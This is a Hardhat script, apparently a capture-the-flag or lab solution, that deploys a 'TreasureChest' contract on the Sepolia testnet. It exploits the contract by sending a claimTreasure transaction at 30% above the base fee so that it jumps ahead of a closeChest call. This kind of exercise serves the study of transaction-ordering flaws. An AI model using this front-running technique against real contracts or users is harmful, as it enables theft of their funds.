import {ethers, network} from "hardhat";

async function main() {

    /*
        This exploit is to be run on the sepolia testnet network 
        and not hardhat network
        Sepolia has already been added to this project and can be invoked during the run command
        by adding option and value: '--network sepolia' at end of the command
    */

        
    /* ------------------------------ Collection of addresses and -----------------------*/
    const [add1, add2] = await ethers.getSigners()
    const tc = await ethers.deployContract("TreasureChest")
    await tc.waitForDeployment()
    console.log(`TreasureChest Contract deployed at address : ${tc.target}`)
    /* ------------------------------- Deployment of Contracts ------------------------*/


    /* ---------------- Calculation of gas prices begins ----------------------*/

    const blockInfo = await network.provider.send("eth_getBlockByNumber", [
        "pending",
        false
    ])

    const baseFee = blockInfo.baseFeePerGas;
    const numBaseFee = parseInt(baseFee, 16)
    //Since baseFeePerGas is a hex value returned in string format.

    const per30 = Math.round(numBaseFee * 30 / 100)
    const fee1 = numBaseFee + per30
    // Required to be 28% more, we have given 30% more for ensuring success of exploit

    /* ---------------- Calculation of gas prices ends ----------------------*/


    /* -------------------- Exploit Begins --------------------------------*/

    await tc.connect(add1).closeChest({gasPrice : baseFee})
    await tc.connect(add2).claimTreasure({gasPrice: fee1})

    /* -------------------- Exploit Ends --------------------------------*/
}

main().catch((error) => {
    console.error(error)
    process.exitCode=1
})